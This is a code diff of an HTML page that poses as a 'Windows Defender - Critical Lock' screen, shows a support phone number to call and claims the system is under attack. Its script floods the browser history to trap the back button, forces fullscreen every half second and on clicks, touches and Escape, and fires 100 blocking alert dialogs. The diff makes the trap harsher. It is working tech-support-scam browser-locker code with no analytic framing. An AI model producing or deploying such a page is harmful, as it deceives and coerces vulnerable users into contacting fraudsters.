@@ -3,7 +3,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Ultimate Security Lock</title>
+  <title>Persistent Security Lock</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
@@ -40,6 +40,7 @@
     let alertFlood = true;
     let alertCount = 0;
 
+    // Deep pushState to trap back button
     for (let i = 0; i < 100; i++) {
       history.pushState({}, '', location.href + '#' + i);
     }
@@ -50,9 +51,19 @@
       else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
     }
 
-    document.addEventListener("click", forceFullscreen);
+    function loopFullscreenForever() {
+      setInterval(() => {
+        forceFullscreen();
+      }, 500); // Every 0.5 second
+    }
 
-    document.addEventListener('keydown', function(e) {
+    document.addEventListener("DOMContentLoaded", () => {
+      loopFullscreenForever();
+    });
+
+    document.addEventListener("click", forceFullscreen);
+    document.addEventListener("touchstart", forceFullscreen);
+    document.addEventListener("keydown", function(e) {
       if (e.key === 'Escape') {
         e.preventDefault();
         forceFullscreen();
@@ -61,22 +72,22 @@
 
     function showAlerts(n) {
       if (n >= 100) {
-        alert("✅ You may now exit this security screen.");
+        alert("✅ 100 alerts shown. You may now exit.");
         return;
       }
       setTimeout(() => {
         forceFullscreen();
         alertCount++;
-        alert(`🚫 Security Alert ${alertCount}/100:\nYou cannot leave this screen.`);
+        alert(`🚫 Security Alert ${alertCount}/100\nSystem exit blocked.`);
         history.pushState({}, '', location.href + '#' + Math.random());
+        forceFullscreen();
         showAlerts(n + 1);
-      }, 200);
+      }, 100);
     }
 
     window.onpopstate = function () {
       if (alertFlood) {
         alertFlood = false;
-        forceFullscreen();
         showAlerts(0);
       }
     };
@@ -85,11 +96,10 @@
 <body>
   <div class="overlay">
     <h1>⚠️ Windows Defender - Critical Lock</h1>
-    <p>Your device is under threat!</p>
+    <p>Your system is under attack!</p>
     <p>Call Support Immediately: <strong>+1-800-FAKE-NUM</strong></p>
-    <p>Back navigation and exit are restricted for your safety.</p>
-    <p><strong>This screen will remain locked until 100 security alerts are acknowledged.</strong></p>
-    <p>Tap anywhere to activate fullscreen mode.</p>
+    <p><strong>This screen will stay locked in fullscreen until 100 security alerts are acknowledged.</strong></p>
+    <p>Tap anywhere to activate and maintain fullscreen mode.</p>
   </div>
 </body>
 </html>
